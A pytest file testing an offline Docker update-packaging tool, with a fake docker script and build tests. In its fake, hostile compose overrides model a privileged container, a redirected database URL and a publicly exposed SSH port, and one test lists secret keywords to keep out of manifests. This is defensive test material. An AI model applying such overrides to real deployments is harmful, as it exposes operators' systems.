"""Offline update package tooling (scripts/offline/offline_package.py).

MOCK VERIFIED ONLY: ``docker`` is a stateful recording fake on PATH. It keeps
an image store (tags, image IDs, layer lists, image configs), writes and reads
REAL docker-archive tar files for ``save`` / ``load``, and models the
application and database containers (image, env, published ports, start time,
volumes) and the records of the database (one id per row of ``counts``, or the
explicit ``records`` of a table). git, tar, SHA-256 and ssh-keygen signatures
are real. The same commands against a REAL Docker daemon + Compose are
exercised by tests/test_offline_real_docker.py (CB5400_REAL_DOCKER=1); what
neither covers is listed in docs/review/PHASE12D4_WINDOWS_ACCEPTANCE_CHECKLIST.md.

Phase 12D5 contract (see the module docstring of the tool): the operator's
compose file names ``chatbot5400:local`` (DEPLOY_IMAGE_TAG) and carries
REQUIRED_APP_ENV; the tool moves that tag only after a verified finish /
rollback.
"""

from __future__ import annotations

import collections
import copy
import hashlib
import http.server
import io
import itertools
import json
import os
import shutil
import subprocess
import sys
import tarfile
import threading
from pathlib import Path
from typing import Any, Dict, List

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts" / "offline"))

import offline_package as OP  # noqa: E402


def _image_config(seed: str) -> str:
    """A minimal image config blob; its SHA-256 is the classic-store image ID."""
    layers = [
        "sha256:" + hashlib.sha256(f"{seed}-layer-{i}".encode()).hexdigest()
        for i in range(3)
    ]
    return json.dumps(
        {
            "architecture": "amd64",
            "os": "linux",
            "rootfs": {"type": "layers", "diff_ids": layers},
        },
        sort_keys=True,
    )


def _config_id(config: str) -> str:
    return "sha256:" + hashlib.sha256(config.encode()).hexdigest()


NEW_CONFIG, OLD_CONFIG, NEXT_CONFIG, OTHER_CONFIG = (
    _image_config(s) for s in ("new", "old", "next", "other")
)
IMAGE_ID, OLD_ID, NEXT_ID, OTHER_ID = (
    _config_id(c) for c in (NEW_CONFIG, OLD_CONFIG, NEXT_CONFIG, OTHER_CONFIG)
)
DB_IMAGE_ID = "sha256:" + "d" * 64
TARGET = "chatbot5400:1.3.0-rc.1"
DEPLOY_TAG = "chatbot5400:local"
# What the operator's own compose files give the application (contract step 2).
OPERATOR_ENV = {
    "SURREAL_URL": "ws://surrealdb:8000/rpc",
    "OCR_RAPIDOCR_PERSISTENT": "true",
    "OCR_OFFLINE": "true",
}

FAKE_DOCKER = r"""#!/usr/bin/env python3
import hashlib, io, json, os, re, sys, tarfile
state_path = os.environ["FAKE_DOCKER_STATE"]
state = json.load(open(state_path))
argv = sys.argv[1:]
with open(state["log"], "a") as log:
    log.write(json.dumps(argv) + "\n")
def save():
    json.dump(state, open(state_path, "w"))
def out(x):
    sys.stdout.write(x if isinstance(x, str) else json.dumps(x)); sys.stdout.write("\n")
def image_id(ref):
    if ref in state["images"]: return state["images"][ref]
    if ref in state["image_configs"]: return ref
    return None
def layers(iid):
    return json.loads(state["image_configs"][iid])["rootfs"]["diff_ids"]
APP, DB = "open_notebook", "surrealdb"
def image_config(iid):
    # The run configuration of an image: its config blob's own `config`; an image
    # the fake did not load and whose blob has none is the image just BUILT on the
    # build machine and carries the labels of state["labels"] (build-package.sh).
    blob = json.loads(state["image_configs"][iid])
    if "config" in blob: return blob["config"]
    if iid in state.get("loaded", {}): return {}
    return {"Labels": state.get("labels", {})} if state.get("labels") else {}
if argv[:2] == ["image", "inspect"]:
    iid = image_id(argv[-1])
    if iid is None: sys.exit(1)
    if "--format" in argv:
        out(iid + " " + json.dumps(layers(iid))); sys.exit(0)
    out([{"Id": iid, "Os": "linux", "Architecture": state.get("arch", "amd64"),
          "Created": "2026-11-17T00:00:00Z", "RootFS": {"Type": "layers", "Layers": layers(iid)},
          "Config": image_config(iid)}]); sys.exit(0)
if argv[0] == "info":
    out({"{{.Architecture}}": "x86_64", "{{.DockerRootDir}}": state["root"], "{{.OSType}}": "linux"}[argv[-1]]); sys.exit(0)
if argv[0] == "run" and "inventory" in argv:
    out(state["inventory"]); sys.exit(0)
if argv[0] == "tag":
    iid = image_id(argv[1])
    if iid is None: sys.exit(1)
    state["images"][argv[2]] = iid; save(); sys.exit(0)
if argv[0] == "save":
    if state.get("save_rc"): sys.exit(state["save_rc"])
    if state.get("save_hang"):  # an interrupted build (E1-04): say so, then hang until killed
        import time
        open(state["save_hang"], "w").write(str(os.getpid())); time.sleep(600)
    path, ref = argv[2], argv[3]
    config = state["image_configs"][image_id(ref)].encode()
    name = hashlib.sha256(config).hexdigest() + ".json"
    manifest = json.dumps([{"Config": name, "RepoTags": state.get("save_tags") or [ref], "Layers": ["l0/layer.tar"]}]).encode()
    with tarfile.open(path, "w") as tar:
        for n, data in (("manifest.json", manifest), (name, config), ("l0/layer.tar", b"layer" * 4000)):
            info = tarfile.TarInfo(n); info.size = len(data); tar.addfile(info, io.BytesIO(data))
    sys.exit(0)
if argv[0] == "load":
    with tarfile.open(argv[2]) as tar:
        entry = json.load(tar.extractfile("manifest.json"))[0]
        config = tar.extractfile(entry["Config"]).read()
    iid = "sha256:" + hashlib.sha256(config).hexdigest()
    if state.get("store") == "containerd":  # another image store: another image ID, same layers
        iid = "sha256:" + hashlib.sha256(b"containerd-manifest:" + config).hexdigest()
    state["image_configs"][iid] = config.decode()
    state.setdefault("loaded", {})[iid] = True
    for tag in entry["RepoTags"]: state["images"][tag] = iid
    save(); out("Loaded image: " + ", ".join(entry["RepoTags"])); sys.exit(0)
if argv[0] == "inspect" and "--type" in argv and argv[argv.index("--type") + 1] == "volume":
    v = state.get("volumes", {}).get(argv[-1])
    if v is None: sys.exit(1)
    out(v.get("created", "")); sys.exit(0)
if argv[0] == "inspect":
    # by compose key or by container id, as `compose ps -q` reports ids (a new one per recreate)
    c = state["containers"].get(argv[-1]) or next(
        (x for x in state["containers"].values() if x.get("id") == argv[-1]), None)
    if not c: sys.exit(1)
    if "--format" in argv:
        fmt = argv[argv.index("--format") + 1]
        if fmt == "{{.Image}}": out(c["image_id"])
        elif fmt == "{{.Config.Image}}": out(c["image"])
        elif fmt == "{{json .NetworkSettings.Ports}}": out(c.get("ports", {}))
        elif fmt == "{{json .Config.Env}}": out(["%s=%s" % kv for kv in sorted(c.get("env", {}).items())])
        sys.exit(0)
    out([{"Id": c["id"], "Image": c["image_id"], "Mounts": c.get("mounts", []),
          "State": {"StartedAt": c.get("started_at"), "Running": c.get("running", True)}}]); sys.exit(0)
if argv[0] == "compose":
    files = [argv[i + 1] for i, a in enumerate(argv) if a == "-f"]
    i = 1
    while i < len(argv) and argv[i] in ("-p", "-f", "--project-directory"): i += 2
    rest = argv[i:]
    def effective():
        cfg = json.loads(json.dumps(state["config"]))
        app = cfg["services"][APP]
        for f in files:
            name = os.path.basename(f)
            text = open(f).read() if os.path.exists(f) else ""
            m = re.search(r'^\s+image: "?([^"\n]+)"?\s*$', text, re.M)
            if m: app["image"] = m.group(1)
            if "pull_policy: never" in text: app["pull_policy"] = "never"
            block = re.search(r"environment:\n((?:\s+[A-Z0-9_]+: .*\n?)+)", text)
            if block:
                env = app.setdefault("environment", {})
                for line in block.group(1).splitlines():
                    k, v = line.strip().split(": ", 1); env[k] = v.strip('"')
            if "maintenance" in name:
                for p in app["ports"]: p["host_ip"] = "127.0.0.1"
            if name.startswith("evil-db") or "x-evil-db" in text: cfg["services"][DB]["image"] = "surrealdb/surrealdb:v3"
            if name.startswith("evil-app"): app["privileged"] = True
            if name.startswith("evil-env"): app.setdefault("environment", {})["SURREAL_URL"] = "ws://elsewhere:8000"
            if name.startswith("evil-volume"): cfg.setdefault("volumes", {})["other"] = {}
            if name.startswith("evil-port"): app["ports"].append({"target": 22, "published": "2222", "host_ip": "0.0.0.0"})
        return cfg
    if rest[:1] == ["config"]: out(effective()); sys.exit(0)
    if rest[:2] == ["ps", "-q"]:
        # like Docker: the container ID, which changes with every recreate
        key = {APP: "c1", DB: "db1"}.get(rest[2])
        c = state["containers"].get(key)
        out(c.get("id", key) if c else ""); sys.exit(0)
    if rest[:2] == ["exec", "-T"]:
        cmd = rest[3:]
        joined = " ".join(cmd)
        running = state["containers"]["c1"]["image_id"]
        for needle in state.get("fail", []) + state.get("fail_on_image", {}).get(running, []):
            if re.search(needle, joined): sys.exit(1)
        if cmd[:1] == ["cat"]: out(state["versions"].get(running, state["version"])); sys.exit(0)
        if "get_latest_version" in joined: out(str(state["schema"])); sys.exit(0)
        if "FINGERPRINT" in joined:
            # one record id per counted row (or the explicit ids of state["records"]);
            # tables with `updated` report it ("u1" for the ids of state["touched"])
            raw = {}
            for t, n in state["counts"].items():
                ids = state.get("records", {}).get(t) or ["%s:%d" % (t, i) for i in range(1, n + 1)]
                touched = state.get("touched", {}).get(t, [])
                upd = None if t == "source_embedding" else ["u1" if i in touched else "u0" for i in ids]
                raw[t] = {"ids": ids, "updated": upd}
            out("FINGERPRINT " + json.dumps(raw)); sys.exit(0)
        if "TABLES =" in joined: out(json.dumps(state["counts"])); sys.exit(0)
        if "command WHERE" in joined: out(str(state["jobs"])); sys.exit(0)
        if "import_rapidocr_weights" in joined: out(json.dumps(state["rapidocr"])); sys.exit(0)
        if "ARTIFACTS" in joined: out("ARTIFACTS " + json.dumps(state["artifacts"])); sys.exit(0)
        sys.exit(0)
    if rest[:1] == ["up"]:
        app = effective()["services"][APP]
        iid = image_id(app["image"])
        if iid is None: sys.stderr.write("pull access denied (pull_policy never)\n"); sys.exit(1)
        # the quiesce recreate (maintenance file, same image) is not "the recreate" a
        # test describes with on_up: it gets on_quiesce instead
        quiesce = (any("maintenance" in os.path.basename(f) for f in files)
                   and iid == state["containers"]["c1"]["image_id"])
        state["ups"] = state.get("ups", 0) + 1
        ports = {"%s/tcp" % p["target"]: [{"HostIp": p.get("host_ip", "0.0.0.0"), "HostPort": str(p["published"])}]
                 for p in app.get("ports", [])}
        state["containers"]["c1"] = {"id": "app-container-%d" % state["ups"], "image": app["image"], "image_id": iid,
                                     "env": app.get("environment", {}), "ports": ports}
        if state.get("up_recreates_db"):
            state["containers"]["db1"]["id"] = "db-container-recreated"
            state["containers"]["db1"]["started_at"] = "2026-11-18T09:00:00Z"
        if state.get("up_restarts_db") and not quiesce:  # same container, restarted
            state["containers"]["db1"]["started_at"] = "2026-11-18T10:00:00Z"
        state.update(state.get("on_quiesce", {}) if quiesce else state.get("on_up", {}))
        save(); sys.exit(0)
    sys.exit(0)
sys.exit(0)
"""


@pytest.fixture
def fake_docker(tmp_path, monkeypatch):
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    docker = bin_dir / "docker"
    docker.write_text(FAKE_DOCKER)
    docker.chmod(0o755)
    state: Dict[str, Any] = {
        "log": str(tmp_path / "docker.log"),
        "root": str(tmp_path),
        "images": {
            "chatbot5400:local": OLD_ID,
            TARGET: IMAGE_ID,
            "chatbot5400:1.3.1": NEXT_ID,
        },
        "image_configs": {
            OLD_ID: OLD_CONFIG,
            IMAGE_ID: NEW_CONFIG,
            NEXT_ID: NEXT_CONFIG,
        },
        "labels": {},
        "containers": {
            "c1": {
                "id": "app-container-0",
                "image": "chatbot5400:local",
                "image_id": OLD_ID,
                "env": dict(OPERATOR_ENV),
                "ports": {"8502/tcp": [{"HostIp": "0.0.0.0", "HostPort": "8502"}]},
            },
            "db1": {
                "id": "db-container-original",
                "image": "surrealdb/surrealdb:v2",
                "image_id": DB_IMAGE_ID,
                "mounts": [
                    {"Type": "volume", "Name": "cb_surreal", "Destination": "/mydata"}
                ],
                "started_at": "2026-11-01T08:00:00Z",
                "running": True,
            },
        },
        "volumes": {"cb_surreal": {"created": "2026-10-01T08:00:00Z"}},
        "version": "1.2.0",
        "versions": {OLD_ID: "1.2.0", IMAGE_ID: "1.3.0", NEXT_ID: "1.3.1"},
        "schema": 33,
        "jobs": 0,
        "counts": {
            "source": 120,
            "notebook": 7,
            "note": 31,
            "source_embedding": 5400,
            "source_insight": 12,
        },
        "rapidocr": {
            "copied": {"det.onnx": "existing", "rec.onnx": "imported"},
            "on_volume": [["det.onnx", 10], ["rec.onnx", 20]],
        },
        "artifacts": {
            "ocr_models": [
                ["easyocr/craft_mlt_25k.pth", 83152330],
                ["rapidocr/det.onnx", 10],
                ["rapidocr/rec.onnx", 20],
                ["tesseract/best/vie.traineddata", 11000000],
                ["tesseract/custom/agri/2026.10.1/vie_agri.traineddata", 9000000],
                ["tesseract/fast/osd.traineddata", 10562727],
                ["tesseract/fast/vie.traineddata", 530000],
            ],
            "huggingface_hub": [
                [
                    "models--docling-project--docling-layout-heron/snapshots/a/model.safetensors",
                    171000000,
                ],
                [
                    "models--docling-project--docling-models/snapshots/b/model_artifacts/tableformer/accurate/tableformer_accurate.safetensors",
                    213000000,
                ],
            ],
        },
        "inventory": {
            "app_version": "1.3.0",
            "schema_version": 33,
            "python": "3.12",
            "dependencies": {
                "docling": "2.129.0",
                "docling-core": "2.96.0",
                "content-core": "2.0.7",
            },
            "tesseract": "tesseract 5.5.0",
            "runtimes_baked": {
                "docling": True,
                "easyocr": True,
                "tesseract": True,
                "tiktoken_offline": True,
                "docling_tsv_patch": True,
                "docling_text_patch": True,
            },
            "runtime_artifacts": {
                "rapidocr_weights_sha256": {},
                "tiktoken": {"encoding": "o200k_base", "loads_offline": True},
                "docling_tsv_patch": {"applied": True, "patch": "E0-07/tesseract-tsv-text/1"},
                "docling_text_patch": {
                    "applied": True,
                    "patches": ["D8-03/hyphen-preservation/1", "D8-02/attached-footnotes/1"],
                },
            },
        },
        "config": {
            "services": {
                "open_notebook": {
                    "image": "chatbot5400:local",
                    "environment": dict(OPERATOR_ENV),
                    "ports": [
                        {"target": 8502, "published": "8502", "host_ip": "0.0.0.0"}
                    ],
                },
                "surrealdb": {
                    "image": "surrealdb/surrealdb:v2",
                    "volumes": [{"source": "cb_surreal", "target": "/mydata"}],
                },
            },
            "volumes": {"cb_surreal": {}},
        },
    }
    for root in state["artifacts"].values():
        for entry in root:  # [name, size, sha256 of the content]
            entry.append(hashlib.sha256(entry[0].encode()).hexdigest())
    state_path = tmp_path / "docker_state.json"
    state_path.write_text(json.dumps(state))
    monkeypatch.setenv("FAKE_DOCKER_STATE", str(state_path))
    monkeypatch.setenv("PATH", f"{bin_dir}{os.pathsep}{os.environ['PATH']}")
    # `verify` (no --config) and load_package() read this file: STATE_DIR of the test
    _write_minimal_conf(tmp_path)
    monkeypatch.setenv("CB5400_OFFLINE_CONFIG", str(tmp_path / "offline-update.conf"))

    class Fake:
        path = state_path

        def get(self):
            return json.loads(state_path.read_text())

        def set(self, **kw):
            s = self.get()
            s.update(kw)
            state_path.write_text(json.dumps(s))

        def edit(self, fn):
            s = self.get()
            fn(s)
            state_path.write_text(json.dumps(s))

        def calls(self):
            log = Path(self.get()["log"])
            return (
                [json.loads(x) for x in log.read_text().splitlines()]
                if log.is_file()
                else []
            )

        def forget_image(self, tag):
            """The server never saw this image: only ``docker load`` brings it."""

            def drop(s):
                iid = s["images"].pop(tag, None)
                if iid and iid not in s["images"].values():
                    s["image_configs"].pop(iid, None)

            self.edit(drop)

        def app(self):
            return self.get()["containers"]["c1"]

    return Fake()


def _git(checkout: Path, *a: str) -> str:
    return subprocess.run(
        ["git", "-C", str(checkout), *a], check=True, capture_output=True, text=True
    ).stdout.strip()


@pytest.fixture
def repo(tmp_path):
    r = tmp_path / "repo"
    r.mkdir()
    _git(r, "init", "-q", "-b", "main")
    _git(r, "config", "user.email", "t@example.invalid")
    _git(r, "config", "user.name", "t")
    (r / "VERSION").write_text("1.2.0\n")
    (r / "README.md").write_text("ChatBot5400\n")
    (r / "app.py").write_text("print('v1.2.0')\n")
    _git(r, "add", ".")
    _git(r, "commit", "-qm", "v1.2.0")
    _git(r, "tag", "v1.2.0")
    (r / "VERSION").write_text("1.3.0\n")
    (r / "app.py").write_text("print('v1.3.0')\n")
    (r / "docs" / "deployment").mkdir(parents=True)
    (r / "docs" / "deployment" / "OFFLINE_UPDATE_UBUNTU_GUIDE.md").write_text(
        "# guide\n"
    )
    (r / "docs" / "deployment" / "OFFLINE_UPDATE_MANUAL_FALLBACK.md").write_text(
        "# manual procedure\n"
    )
    _git(r, "add", ".")
    _git(r, "commit", "-qm", "phase 12")
    return r


def _label_image(repo, version="1.3.0-rc.1", git_ref="HEAD"):
    """What build-package.sh / .ps1 do: the image carries the OCI revision and version
    labels of the commit it was built from (R2-08). Labels of the fake's build image."""
    state_path = Path(os.environ["FAKE_DOCKER_STATE"])
    state = json.loads(state_path.read_text())
    state["labels"] = {
        "org.opencontainers.image.revision": _git(repo, "rev-parse", git_ref + "^{commit}"),
        "org.opencontainers.image.version": version,
    }
    built = state["images"].get(f"chatbot5400:{version}")
    state.get("loaded", {}).pop(built, None)  # it is the image just built here
    state_path.write_text(json.dumps(state))


def _build_rc(repo, out, *extra, version="1.3.0-rc.1"):
    """A build as it is called; the image keeps whatever labels the fake gives it."""
    return OP.main(
        ["build", "--version", version, "--image", f"chatbot5400:{version}",
         "--repo", str(repo), "--out", str(out), *extra]
    )  # fmt: skip


def _build(repo, tmp_path, *extra, version="1.3.0-rc.1", out="dist"):
    """A build of an image made by the official script (labelled with this commit)."""
    out_dir = tmp_path / out
    _label_image(repo, version)
    assert _build_rc(repo, out_dir, *extra, version=version) == 0
    pkg = next(out_dir.glob("*.tar.gz"))
    return pkg, OP.sha256_file(pkg)


@pytest.fixture
def package(fake_docker, repo, tmp_path):
    return _build(repo, tmp_path)


def _verify(pkg, dest, *extra):
    return OP.main(
        ["verify", str(pkg), "--extract-to", str(dest), "--platform", "linux/amd64", *extra]
    )  # fmt: skip


def _manifest_of(pkg):
    with tarfile.open(pkg) as t:
        top = t.getnames()[0].split("/")[0]
        fh = t.extractfile(f"{top}/manifest.json")
        assert fh is not None
        return json.loads(fh.read())


# --------------------------------------------------------------------------- #
# build (F-04, F-05, F-27)
# --------------------------------------------------------------------------- #


def test_build_uses_docker_save_and_git_bundle(package, fake_docker, repo):
    pkg, _ = package
    calls = fake_docker.calls()
    assert any(c[0] == "save" for c in calls)
    assert not any(
        c[0] in ("export", "push", "pull", "login", "build", "buildx") for c in calls
    )
    run_call = next(c for c in calls if c[0] == "run")
    assert run_call[run_call.index("--network") + 1] == "none"
    names = tarfile.open(pkg).getnames()
    top = names[0].split("/")[0]
    for rel in (
        "manifest.json", "SHA256SUMS", "images/chatbot5400-1.3.0-rc.1.tar",
        "source/chatbot5400-1.3.0-rc.1.bundle", "scripts/update.sh", "scripts/pin.sh",
        "scripts/snapshot.sh", "scripts/offline_package.py",
        "docs/OFFLINE_UPDATE_MANUAL_FALLBACK.md",  # 12D5: the manual procedure travels with it
    ):  # fmt: skip
        assert f"{top}/{rel}" in names
    manifest = _manifest_of(pkg)
    assert manifest["package_format_version"] == 3  # 12D5: run config + provenance
    image = manifest["image"]
    assert image["id"] == IMAGE_ID and image["config_digest"] == IMAGE_ID
    assert image["diff_ids"] == json.loads(NEW_CONFIG)["rootfs"]["diff_ids"]
    assert image["repo_tags"] == [TARGET]
    assert image["run_config_sha256"] == OP.run_config_sha256({}, "linux", "amd64")
    assert image["provenance"] == "verified" and image["app_version"] == "1.3.0"
    assert image["labels"]["org.opencontainers.image.revision"] == _git(repo, "rev-parse", "HEAD")
    assert manifest["database"] == {
        "schema_version": 33,
        "migration_required": False,
        "compatible_schema_versions": [33],
    }
    assert manifest["readiness"]["status"] == "READY"
    src = manifest["source"]
    assert src["base_ref"] == "v1.2.0"
    assert src["commit"] == _git(repo, "rev-parse", "HEAD")
    assert src["base_commit"] == _git(repo, "rev-parse", "v1.2.0")
    assert src["bundle_ref"] == "refs/cb5400-offline/build/1.3.0-rc.1"
    blob = json.dumps(manifest).lower()
    for word in ("password", "api_key", "secret=", ".env"):
        assert word not in blob


def test_build_bundle_carries_a_named_ref_and_leaves_no_temp_ref(
    package, repo, tmp_path
):
    """F-04 / F-05: the bundle is real, verified, and names the release commit."""
    pkg, _ = package
    work = tmp_path / "unpacked"
    with tarfile.open(pkg) as t:
        t.extractall(work, filter="data")
    bundle = next(work.rglob("*.bundle"))
    _git(repo, "bundle", "verify", str(bundle))
    heads = OP.bundle_heads(repo, bundle)
    assert heads == {
        "refs/cb5400-offline/build/1.3.0-rc.1": _git(repo, "rev-parse", "HEAD")
    }
    assert _git(repo, "for-each-ref", "refs/cb5400-offline") == ""  # temp ref deleted


def test_build_accepts_a_commit_sha_and_a_ref_name(fake_docker, repo, tmp_path):
    sha = _git(repo, "rev-parse", "HEAD")
    _label_image(repo)  # built from this commit by the official script (R2-08)
    assert _build_rc(repo, tmp_path / "a", "--git-ref", sha) == 0
    assert _build_rc(repo, tmp_path / "b", "--git-ref", "main") == 0
    assert _build_rc(repo, tmp_path / "c", "--git-ref", "no-such-ref") == OP.EXIT_USAGE


@pytest.mark.parametrize("requested", ["1.4.0", "1.3.1-rc.1", "2.0.0", "1.3"])
def test_build_version_mismatch_is_refused_before_any_docker_call(
    fake_docker, repo, tmp_path, requested
):
    """F-27: VERSION of the commit is 1.3.0 -> only 1.3.0 / 1.3.0-<suffix>."""
    assert _build_rc(repo, tmp_path / "dist", version=requested) == OP.EXIT_USAGE
    assert fake_docker.calls() == []
    assert not (tmp_path / "dist").exists() or not any((tmp_path / "dist").iterdir())


def test_version_rule_on_the_real_repository():
    """VERSION stays 1.2.0 in Phase 12: `1.3.0-rc.1` cannot be packaged from it."""
    assert (ROOT / "VERSION").read_text().strip() == "1.2.0"
    assert OP.version_matches("1.2.0", "1.2.0")
    assert OP.version_matches("1.2.0", "1.2.0-phase12.1")
    assert not OP.version_matches("1.2.0", "1.3.0-rc.1")
    assert not OP.version_matches("1.2.0", "1.2.1")
    assert not OP.version_matches("", "1.2.0")
    bad = OP.main(["check-version", "--version", "1.3.0-rc.1", "--repo", str(ROOT)])
    good = OP.main(
        ["check-version", "--version", "1.2.0-phase12.1", "--repo", str(ROOT)]
    )
    assert (bad, good) == (OP.EXIT_USAGE, 0)


def test_build_wrong_base_is_refused_before_any_docker_call(
    fake_docker, repo, tmp_path
):
    assert _build_rc(repo, tmp_path / "a", "--base-ref", "v9.9.9") == OP.EXIT_USAGE
    # a base that is not an ancestor of the commit (side branch)
    _git(repo, "checkout", "-q", "-b", "side", "v1.2.0")
    (repo / "side.txt").write_text("x\n")
    _git(repo, "add", ".")
    _git(repo, "commit", "-qm", "side")
    _git(repo, "checkout", "-q", "main")
    assert _build_rc(repo, tmp_path / "b", "--base-ref", "side") == OP.EXIT_USAGE
    assert fake_docker.calls() == []
    assert not list(tmp_path.glob("*/ChatBot5400-*"))
    assert _git(repo, "for-each-ref", "refs/cb5400-offline") == ""


def test_build_refuses_a_dirty_checkout_and_a_wrong_image_revision(
    fake_docker, repo, tmp_path
):
    (repo / "app.py").write_text("print('edited')\n")
    assert _build_rc(repo, tmp_path / "a") == OP.EXIT_USAGE
    _git(repo, "checkout", "--", "app.py")
    fake_docker.set(labels={"org.opencontainers.image.revision": "f" * 40})
    assert (
        _build_rc(repo, tmp_path / "b") == OP.EXIT_USAGE
    )  # image built from another commit
    assert not list(tmp_path.glob("*/ChatBot5400-*"))


def test_interrupted_build_leaves_nothing_behind_and_can_be_repeated(
    fake_docker, repo, tmp_path
):
    """F-04: no half-built stage directory blocks the next run; no temp ref stays."""
    _label_image(repo)
    fake_docker.set(save_rc=1)  # docker save fails (disk full, daemon stopped...)
    out = tmp_path / "dist"
    assert _build_rc(repo, out) == OP.EXIT_UPDATE
    assert not list(out.glob("ChatBot5400-*"))
    assert _git(repo, "for-each-ref", "refs/cb5400-offline") == ""
    fake_docker.set(save_rc=0)
    assert _build_rc(repo, out) == 0
    assert len(list(out.glob("*.tar.gz"))) == 1


def test_build_refuses_an_archive_with_more_tags_than_approved(
    fake_docker, repo, tmp_path
):
    _label_image(repo)  # a well-made image: only the extra tag is wrong
    fake_docker.set(save_tags=[TARGET, "chatbot5400:latest"])
    assert _build_rc(repo, tmp_path / "dist") == OP.EXIT_USAGE
    assert not list((tmp_path / "dist").glob("ChatBot5400-*"))


def test_build_marks_not_ready_without_offline_token_encoding(
    fake_docker, repo, tmp_path
):
    """F-22: an image whose tiktoken encoding needs the network is NOT_READY."""

    def no_tiktoken(s):
        s["inventory"]["runtimes_baked"]["tiktoken_offline"] = False

    fake_docker.edit(no_tiktoken)
    pkg, _ = _build(repo, tmp_path)
    readiness = _manifest_of(pkg)["readiness"]
    assert readiness["status"] == "NOT_READY"
    assert any("tiktoken" in p for p in readiness["problems"])


@pytest.fixture
def repo_with_scripts(repo):
    """The build wrappers run from the checkout they package."""
    dest = repo / "scripts" / "offline"
    dest.mkdir(parents=True)
    for f in (ROOT / "scripts" / "offline").iterdir():
        if f.is_file():
            shutil.copy2(f, dest / f.name)
    _git(repo, "add", ".")
    _git(repo, "commit", "-qm", "offline tooling")
    return repo


def test_build_package_sh_checks_the_version_before_docker(
    fake_docker, repo_with_scripts, tmp_path
):
    """F-27 through the real wrapper: nothing Docker-related runs on a mismatch."""
    script = repo_with_scripts / "scripts" / "offline" / "build-package.sh"
    proc = subprocess.run(
        ["bash", str(script), "--version", "1.4.0", "--out", str(tmp_path / "o")],
        capture_output=True, text=True,
    )  # fmt: skip
    assert proc.returncode == 2, proc.stderr
    assert fake_docker.calls() == []
    assert not (tmp_path / "o").exists()


def test_build_package_sh_builds_a_package_with_a_usable_bundle(
    fake_docker, repo_with_scripts, tmp_path
):
    """F-04 through the real wrapper (it passes the commit SHA as --git-ref). With
    --no-build the existing image must carry the labels the script's build step adds."""
    script = repo_with_scripts / "scripts" / "offline" / "build-package.sh"
    out = tmp_path / "o"
    _label_image(repo_with_scripts)
    proc = subprocess.run(
        ["bash", str(script), "--version", "1.3.0-rc.1", "--no-build", "--out", str(out)],
        capture_output=True, text=True,
    )  # fmt: skip
    assert proc.returncode == 0, proc.stdout + proc.stderr
    pkg = next(out.glob("*.tar.gz"))
    assert _manifest_of(pkg)["source"]["commit"] == _git(
        repo_with_scripts, "rev-parse", "HEAD"
    )
    assert not any(c[0] in ("buildx", "build") for c in fake_docker.calls())


def test_inventory_probe_applies_the_tsv_patch_with_the_real_docling():
    """The inventory probe itself, against the Docling installed here (2.129.0)."""
    pytest.importorskip("docling")
    probe = OP._probe_docling_tsv_patch(ROOT)
    assert probe["applied"] is True, probe
    assert probe["patch"] == "E0-07/tesseract-tsv-text/1" and probe["docling"] == "2.129.0"


def test_an_image_whose_docling_cannot_take_the_tsv_patch_is_not_ready(
    fake_docker, repo, tmp_path
):
    """E0-07 (Phase 12D7): the image's inventory proves the Docling TSV text patch
    applies there; otherwise Tesseract OCR would refuse to run -> NOT_READY."""

    def no_patch(s):
        s["inventory"]["runtimes_baked"]["docling_tsv_patch"] = False
        s["inventory"]["runtime_artifacts"]["docling_tsv_patch"] = {
            "applied": False,
            "error": "TsvPatchError: docling 2.130.0: written for docling 2.129.0 only",
        }

    fake_docker.edit(no_patch)
    pkg, _ = _build(repo, tmp_path)
    readiness = _manifest_of(pkg)["readiness"]
    assert readiness["status"] == "NOT_READY"
    assert any("TSV text patch (E0-07)" in p and "2.130.0" in p for p in readiness["problems"])


def test_inventory_probe_applies_the_text_preservation_patches_with_the_real_docling():
    """D8-03 / D8-02 (Phase 12D9): the inventory probe itself, against the
    Docling / docling-core installed here (2.129.0 / 2.96.0)."""
    pytest.importorskip("docling")
    probe = OP._probe_docling_text_patch(ROOT)
    assert probe["applied"] is True, probe
    assert probe["patches"] == ["D8-03/hyphen-preservation/1", "D8-02/attached-footnotes/1"]
    assert (probe["docling"], probe["docling_core"]) == ("2.129.0", "2.96.0")


def test_an_image_whose_docling_cannot_take_the_text_patches_is_not_ready(
    fake_docker, repo, tmp_path
):
    """Phase 12D9: without the text preservation patches every PDF / scan
    conversion of the image refuses to run -> NOT_READY, with the reason."""

    def no_patch(s):
        s["inventory"]["runtimes_baked"]["docling_text_patch"] = False
        s["inventory"]["runtime_artifacts"]["docling_text_patch"] = {
            "applied": False,
            "error": "TextPreservationPatchError: docling-core 2.97.0: the "
            "D8-02/attached-footnotes/1 patch is written for docling-core 2.96.0 only",
        }

    fake_docker.edit(no_patch)
    pkg, _ = _build(repo, tmp_path)
    readiness = _manifest_of(pkg)["readiness"]
    assert readiness["status"] == "NOT_READY"
    assert any(
        "text preservation patches" in p and "2.97.0" in p for p in readiness["problems"]
    )


def test_an_older_inventory_without_the_text_patch_probe_is_not_ready(
    fake_docker, repo, tmp_path
):
    """An image whose inventory does not say the patches apply is not assumed
    to take them."""
    fake_docker.edit(lambda s: s["inventory"]["runtimes_baked"].pop("docling_text_patch"))
    pkg, _ = _build(repo, tmp_path)
    readiness = _manifest_of(pkg)["readiness"]
    assert readiness["status"] == "NOT_READY"
    assert any("text preservation patches" in p for p in readiness["problems"])


def test_build_refuses_a_checkout_without_the_manual_procedure(fake_docker, repo, tmp_path):
    """Phase 12D5: every package carries docs/deployment/OFFLINE_UPDATE_MANUAL_FALLBACK.md
    (the production path); a checkout without it is refused before any Docker call."""
    (repo / "docs" / "deployment" / "OFFLINE_UPDATE_MANUAL_FALLBACK.md").unlink()
    _git(repo, "commit", "-qam", "drop the manual procedure")
    _label_image(repo)
    start = len(fake_docker.calls())
    assert _build_rc(repo, tmp_path / "out") == OP.EXIT_USAGE
    assert fake_docker.calls()[start:] == []
    assert not (tmp_path / "out").exists() or not any((tmp_path / "out").iterdir())


def test_build_package_ps1_has_the_same_order_static():
    """PowerShell cannot run in Cloud: STATIC check only (LOCAL VERIFICATION REQUIRED)."""
    ps = (ROOT / "scripts" / "offline" / "build-package.ps1").read_text()
    check = ps.index("'check-version'")
    assert check < ps.index("& docker image ls -q $tag") < ps.index("docker buildx build")
    # R2-22: no native command with redirected stderr under $ErrorActionPreference = 'Stop'
    # (Windows PowerShell 5.1 turns it into a terminating error); still STATIC only
    assert "$ErrorActionPreference = 'Stop'" in ps and "2>$null" not in ps
